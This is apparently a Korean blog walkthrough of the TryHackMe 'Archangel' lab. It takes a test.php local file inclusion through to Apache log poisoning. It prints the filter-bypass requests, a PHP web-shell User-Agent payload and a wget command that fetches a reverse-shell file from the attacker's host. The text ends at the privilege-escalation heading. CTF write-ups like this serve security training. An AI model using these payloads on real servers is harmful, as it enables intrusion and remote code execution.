---
layout: single
title: (THM) Archangel - WriteUP
categories: THM
tag: [log injection, RCE, LFI, log poisoning,THM,TryHackMe, Pentest, Pentesting]
toc: true
author_profile: false
sidebar:
    nav: "counts"
---

해당 문제는 https://tryhackme.com/room/archangel 에서 확인할 수 있습니다.

***

# Archangel 시스템 모의 침투
## 수행 내용
1. 정보 수집
2. 웹 서버 디렉터리중 /test.php 경로 발견
3. /test.php 에서 LFI 취약점 발견
4. Apache2 서버 동작중이었으며, LFI 취약점과 연계하여 로그파일 접근
5. access.log 파일에 Log injection을 통한 PHP 악성(시스템 명령어 실행) 코드 삽입 및 리버스 쉘 실행으로 내부 침투 성공
## 정보수집
### Nmap 스캔 - 사용중인 포트 및 배너, 기본 정보 수집
```
nmap -p- --max-retries 1 -Pn -n --open --min-rate 5000 -T4 -sV -sC -A -oA ./Archangel {target_ip}
```
```
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-18 01:27 EDT
Nmap scan report for {target_ip}
Host is up (0.42s latency).
Not shown: 49099 filtered tcp ports (no-response), 16434 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f1d2c9d6ca40e4640506fedcf1cf38c (RSA)
|   256 637327c76104256a08707a36b2f2840d (ECDSA)
|_  256 b64ed29c3785d67653e8c4e0481cae6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.49 seconds
```
- 22(SSH), 80(http) 포트로 서비스 동작중을 확인함.
- SSH의 경우 Username 열거에 관한 취약점 제외 유의미한 취약점은 없는듯 함.
- 80번 포트로 HTTP 웹 서비스가 서비스 동작중이므로, 해당 서비스를 중심으로 공격 방향을 잡음

![그림1-1](/assets/image/thm_archangel//image.png)
- 해당 주소 접속시 아무런 동작을 수행하지 않는 사이트가 존재함.
- 소스코드에서 유의미한 정보가 노출되어있지 않음
### Gobuster 을 통한 디렉터리 부르트포싱
```
gobuster dir -u {target_ip} -w /usr/share/wordlists/dirb/common.txt -f
```
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://{target_ip}
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess/           (Status: 403) [Size: 276]
/.hta/                (Status: 403) [Size: 276]
/.htpasswd/           (Status: 403) [Size: 276]
Progress: 598 / 4615 (12.96%)obuster dir -u 10.10.182.2 -w /usr/share/wordlists/dirb/common.txt -f
/flags/               (Status: 200) [Size: 934]
/icons/               (Status: 403) [Size: 276]
/images/              (Status: 200) [Size: 0]
/layout/              (Status: 200) [Size: 0]
/pages/               (Status: 200) [Size: 0]
/server-status/       (Status: 403) [Size: 276]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
- 몇몇의 숨겨진 경로를 발견하였으나, 유의미한 경로는 아님
- 유의미한 디렉터리 및 파일은 발견되지 않았음, 
- 공격 대상 IP에 대해 가상 호스트 사용 가능성을 두고 웹 사이트 내 도메인을 찾아봄
- 해당 웹 사이트 우측 상단에 관리자의 이메일이 존재하였으며, 해당 도메인을 /etc/hosts에 타겟 시스템IP와 매칭시켜 접속을 시도해봄
![그림1-2](/assets/image/thm_archangel/image2.png)
- 플래그를 획득 할 수 있었음
### 추가 획득한 도메인에 대한 2차 디렉터리 부르트 포싱
```
gobuster dir -u http://mafialive.thm/ -w /usr/share/wordlists/dirb/common.txt -f -x php, txt
```
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mafialive.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/./                   (Status: 200) [Size: 59]
/.php/                (Status: 403) [Size: 278]
/.hta/                (Status: 403) [Size: 278]
/.hta.php/            (Status: 403) [Size: 278]
/.hta./               (Status: 403) [Size: 278]
/.htaccess/           (Status: 403) [Size: 278]
/.htpasswd/           (Status: 403) [Size: 278]
/.htaccess./          (Status: 403) [Size: 278]
/.htaccess.php/       (Status: 403) [Size: 278]
/.htpasswd.php/       (Status: 403) [Size: 278]
/.htpasswd./          (Status: 403) [Size: 278]
/icons/               (Status: 403) [Size: 278]
/server-status/       (Status: 403) [Size: 278]
/test.php/            (Status: 200) [Size: 286]
```

## 취약점 분석
### test.php 경로 발견
![그림1-3](/assets/image/thm_archangel/image3.png)
- URI 확인시 view 파라미터를 통해 특정 경로의 파일을 include하고 있음.
- 이를 통해 LFI 취약점이 존재할 것이라고 판단함.
- 개념증명을 위해 ../../../../etc/passwd 경로로 접근을 시도하였으나, 허용되지 않음
- 해당 서버가 PHP로 구동 되고 있어 PHP Filter을 사용하여 LFI 취약점 방어를 우회 시도
```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```
- 위와 같이 요청하였으며, PHP Filter을 사용하지 않았을 경우 아무것도 출력되지 않았으나, 위와같이 필터를 적용한 경우 base64 인코딩 된 값이 노출됨
```shell
echo 'CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==' | base64 -d
```

```html
<html>
<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            if(isset($_GET["view"])){
            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                include $_GET['view'];
            }else{

                echo 'Sorry, Thats not allowed';
            }
        }
        ?>
    </div>
</body>
</html>
```

- 디코딩 결과 위 코드가 노출되는 것을 확인함.
- 해당 test.php 파일에서 경로이동 문자의 ../.. 문자열을 필터링 하고 있었으며
- 경로에 /var/www/html/development_testing 경로가 존재해야함.
- 절대경로를 이용하며, ./.././../ 와 같이 필터링을 우회할 수 있음.
- 현재 타겟 시스템에는 ***<span style="color:red"> LFI 취약점이 존재하며, Apache2 서비스가 동작중이다. </span>*** 
- apache 로그파일에 접근이 가능하다. 즉 Log Poisoning(log injection) 공격이 가능하다.

## 내부침투
### Log Poisoning 취약점 공격
![그림1-4](/assets/image/thm_archangel/image4.png)
- access.log 파일에 성공적으로 접근할 수 있었으며
- 해당 파일에는 클라이언트의 User-Agent 정보가 기록된다.
- 이 때 User-Agent 값에 악의적인 코드(PHP 시스템 명령어)를 삽입하게 되면, 서버측에서는 User-Agent 헤더를 해석하며 PHP 소스코드를 만나게되고, 이를 PHP 코드로 인식하여 실행하게 된다.
![그림 1-5](/assets/image/thm_archangel/image5.png)
- 간단하게 echo 를 사용하여 정상적으로 실행되는지 확인 한 결과 악의적인 코드삽입으로 인한 String이 로그파일에 출력되는 걸 알 수 있다.

![그림 1-6](/assets/image/thm_archangel/image6.png)
- Reverse shell 코드가 작성되어 있는 PHP 파일을 생성 후 공격자 PC에서 웹 서버를 구동시켜 User-Agent 헤더를 통해 해당 파일을 가져올 수 있도록 했다.

```
GET /test.php?view=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log&cmd=wget+http://10.4.47.45/reverse.php 
```
![그림 1-7](/assets/image/thm_archangel/image7.png)

- 성공적으로 악성 코드를 받을 수 있었다.

```
GET /test.php?view=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log&cmd=php+reverse.php

'''
User-Agent: <?php system($_GET['cmd']);?>
```

![그림 1-8](/assets/image/thm_archangel/image8.png)
- 성공적으로 웹 서버의 쉘을 획득했다.
## 시스템 권한 상승
